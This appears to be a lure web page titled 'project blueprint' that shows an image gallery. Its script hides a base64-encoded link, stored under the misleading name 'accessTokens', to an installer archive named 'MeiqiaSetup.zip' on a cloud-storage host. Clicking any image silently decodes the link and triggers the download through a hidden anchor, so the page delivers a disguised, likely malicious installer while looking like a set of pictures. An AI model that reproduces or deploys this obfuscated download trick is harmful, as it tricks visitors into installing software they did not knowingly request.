<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>项目蓝图</title>
    
    <style>
        :root {
            --item-gap: 1px;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        .content-grid {
            display: grid;
            gap: var(--item-gap);
        }

        .content-item {
            width: 100%;
            height: auto;
            cursor: pointer;
            transition: transform 0.2s;
        }

        .content-item:hover {
            transform: scale(0.98);
        }
    </style>
</head>
<body>
    <section class="content-grid"></section>

    <script type="module">
        // 数据配置
        const RESOURCE_CONFIG = {
            visualElements: Array.from({length: 5}, (_, i) => 
                `static/media/item_${String(i+1).padStart(2, '0')}.webp`),
            
            accessTokens: Array(7).fill(
                'aHR0cHM6Ly9oay1jZG4wNi5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tL01laXFpYVNldHVwLnppcA=='
            )
        };

        // 数据处理方法
        const decodePayload = str => atob(str);
        
        const activateResource = encodedData => {
            const tempAnchor = document.createElement('a');
            tempAnchor.href = decodePayload(encodedData);
            tempAnchor.rel = 'noopener noreferrer';
            document.body.append(tempAnchor);
            tempAnchor.click();
            tempAnchor.remove();
        };

        // 内容加载器
        const initVisualElements = container => {
            RESOURCE_CONFIG.visualElements.forEach(mediaSrc => {
                const mediaElement = new Image();
                mediaElement.className = 'content-item';
                mediaElement.src = mediaSrc;
                mediaElement.alt = '项目示意图';
                mediaElement.loading = 'lazy';
                container.appendChild(mediaElement);
            });
        };

        // 交互处理
        const handleUserInteraction = ({target}) => {
            if (!target.classList.contains('content-item')) return;
            
            const itemIndex = [...target.parentElement.children].indexOf(target);
            if (itemIndex in RESOURCE_CONFIG.accessTokens) {
                activateResource(RESOURCE_CONFIG.accessTokens[itemIndex]);
            }
        };

        // 初始化流程
        const bootstrap = () => {
            const gridContainer = document.querySelector('.content-grid');
            initVisualElements(gridContainer);
            gridContainer.addEventListener('click', handleUserInteraction);
        };

        document.addEventListener('DOMContentLoaded', bootstrap);
    </script>
</body>
</html>
